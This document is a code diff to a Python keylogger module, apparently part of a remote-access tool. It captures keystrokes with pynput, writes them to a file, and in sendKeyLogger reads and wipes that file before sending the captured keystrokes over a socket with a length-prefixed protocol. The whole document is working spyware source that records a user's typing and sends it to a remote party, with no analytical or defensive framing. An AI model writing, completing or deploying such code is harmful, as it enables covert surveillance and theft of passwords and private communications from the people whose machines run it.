@@ -1,5 +1,6 @@
 from pynput import keyboard
 import threading
+import struct
 import config
 import os
 
@@ -19,20 +20,22 @@ def on_key_press(key):
 
 # Set up the listener
 def hook():
-    with keyboard.Listener(on_press=on_key_press) as listener:
+    with keyboard.Listener(on_press=on_key_press, on_release=None) as listener:
         listener.join()
+
+def deleteKeyLoggerFile():
+    with open(filePath, "w") as fo:
+        pass 
 
 def sendKeyLogger(clientsocket):
     keylogger_content = ""
-    with open(filePath, "r+") as fi:
+    with open(filePath, "r") as fi:
         keylogger_content = fi.read()
-        if len(keylogger_content) == 0 :
-            clientsocket.send("0".encode())
-            return
-        fi.seek(0)
-        fi.truncate()
-    clientsocket.send("1".encode())
-    clientsocket.send(keylogger_content.encode())
+    deleteKeyLoggerFile()
+    print(keylogger_content)
+    keylogger_content = keylogger_content.encode("utf-8")
+    clientsocket.sendall(len(keylogger_content).to_bytes(4, 'big'))
+    clientsocket.sendall(keylogger_content)
 
 def startedKeyLogger():
     config.hook = True
